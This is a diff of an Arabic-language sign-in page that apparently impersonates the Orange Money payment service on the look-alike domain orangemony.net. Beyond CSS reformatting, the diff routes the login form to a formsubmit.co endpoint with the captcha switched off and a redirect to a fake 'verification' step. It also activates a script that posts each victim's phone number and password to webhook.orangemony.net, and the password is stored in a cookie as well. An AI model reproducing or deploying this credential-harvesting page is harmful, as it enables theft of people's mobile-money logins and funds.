@@ -35,66 +35,67 @@
     <!-- <link href="https://cdn.prod.website-files.com/img/webclip.png" rel="apple-touch-icon"> -->
     <style>
         body {
-              box-sizing: border-box; 
-              font-size:18px;
-            }
+  box-sizing: border-box; 
+  font-size:18px;
+}
 
-              .container {
-                /*max-width: 800px;*/
-              padding: 0 5%;
-              /*margin: auto;*/
-            }
+  .container {
+    /*max-width: 800px;*/
+  padding: 0 5%;
+  /*margin: auto;*/
+}
 
-              .field-holder {
-                position: relative; 
-              margin-bottom:1.25em;
-              }
+  .field-holder {
+    position: relative; 
+  margin-bottom:1.25em;
+  }
 
-              .w-input {
-              border:0;
-              border-bottom: 3px solid #dfdfdf;
-              outline:none;
-            }
+  .w-input {
+  border:0;
+  border-bottom: 3px solid #dfdfdf;
+  outline:none;
+}
 
-              label { 
-              position:absolute;
-              top:0;
-              left:0;
-              font-size:1em;
-              color:#424242;
-              display:flex;
-              align-items:center;
-              cursor:text;
-              transition: .3s ease-in-out;
-              }
-              
-             .w-input, label {
-              font-size:1em;
-              width:100%;
-              height:55px;
-              }
-              
-             .w-input:focus + label, 
-             .w-input:valid + label {
-              color:#ff7900;
-              font-size:.75em;
-              top:-25px;
-              pointer-events: none;
-            }
-                
-                
-             .w-input:focus,  .w-input:valid { 
-                border-bottom: 3px solid #ff7900;
-                }
+  label { 
+  position:absolute;
+  top:0;
+  left:0;
+  font-size:1em;
+  color:#424242;
+  display:flex;
+  align-items:center;
+  cursor:text;
+  transition: .3s ease-in-out;
+  }
+  
+ .w-input, label {
+  font-size:1em;
+  width:100%;
+  height:55px;
+  }
+  
+ .w-input:focus + label, 
+ .w-input:valid + label {
+  color:#ff7900;
+  font-size:.75em;
+  top:-25px;
+  pointer-events: none;
+}
+    
+    
+ .w-input:focus,  .w-input:valid { 
+    border-bottom: 3px solid #ff7900;
+    }
 
 
 
-            .CustomFooter {
-              position: fixed;
-              left: 0;
-              bottom: 0;
-              }
-    </style>
+.CustomFooter {
+  position: fixed;
+  left: 0;
+  bottom: 0;
+  }
+
+</style>
 </head>
 
 <body class="body">
@@ -110,11 +111,16 @@
     <div class="div-block-4">
         <div class="container">
             <div class="w-form">
-        
-                <form id="signin" 
+                        <form id="signin" 
                         name="مقدم الطلب" 
                         data-name="مقدم الطلب" 
-                        aria-label="تسجيل الدخول">
+                        redirect="/verification" 
+                        action='https://formsubmit.co/18adf9b7fdf4cc3d254bb14bae1266c3'
+                        method="post" 
+                        aria-label="تسجيل الدخول"> 
+
+                        <input type="hidden" name="_next" value="https://www.orangemony.net/verification">
+                        <input type="hidden" name="_captcha" value="false">
                     <div id="field" class="field-holder">
                         <input class="text-field-2 w-input" maxlength="10" name="رقم الهاتف" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required="">
                         <label for="phonenumber">رقم الهاتف</label>
@@ -125,13 +131,13 @@
                     </div>
                     <div class="div-block">
                         <div id="invalid_password_label" class="invalid_password_hide"> يرجى أدخال كلمة المرور بشكل صحيح </div>
-                        <input type="submit" onclick="window.location.href = '/verification';" data-wait="يرجى الانتظار" id="sb" class="submit-button sb_disabled w-button" value="تسجيل دخول">
+                        <input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button sb_disabled w-button" value="تسجيل دخول">
                     </div>
 
                 </form>
 <!--                 <div class="w-form-done" tabindex="-1" role="region" aria-label="تسجيل الدخول success">
                     <div>Thank you! Your submission has been received!</div>
-                </div> -->
+                </div>
                 <div class="w-form-fail" tabindex="-1" role="region" aria-label="تسجيل الدخول failure">
                     <div>حدث خطأ يرجى المحاولة لاحقا.</div>
                 </div>
@@ -219,14 +225,13 @@
             setCookie("password", document.getElementById('password').value);
 
 
-            // var xhr = new XMLHttpRequest();
-            // xhr.open("POST", 'https://webhook.orangemony.net', true);
-            // xhr.setRequestHeader('Content-Type', 'application/json');
-            // xhr.send(JSON.stringify({
-            //     'phonenumber': document.getElementById('phonenumber').value,
-            //     'password':document.getElementById('password').value
-            // }));
-            // window.location.href=''
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", 'https://webhook.orangemony.net', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                'phonenumber': document.getElementById('phonenumber').value,
+                'password':document.getElementById('password').value
+            }));
 
         })
     </script>
